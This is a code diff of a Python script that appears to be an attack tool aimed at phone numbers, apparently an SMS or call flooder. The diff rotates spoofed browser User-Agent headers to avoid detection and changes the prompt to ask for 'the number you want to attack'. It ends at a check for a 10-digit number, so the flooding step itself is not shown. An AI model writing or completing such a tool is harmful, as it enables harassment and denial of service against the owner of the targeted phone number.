@@ -1,4 +1,4 @@
-    import requests,time,random
+import requests,time,random
 heads = [
     {
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
@@ -22,7 +22,14 @@ heads = [
     },
 ]
 random_head = random.choice(heads)
-number = input("please enter your number: ")
+number = input("""
+Hello there!
+               
+
+
+
+               
+Please enter the number you want to attack: """)
 while len(number) != 10 or number[0] == '0':
     if number[0] == '0':
         number = number[1:]
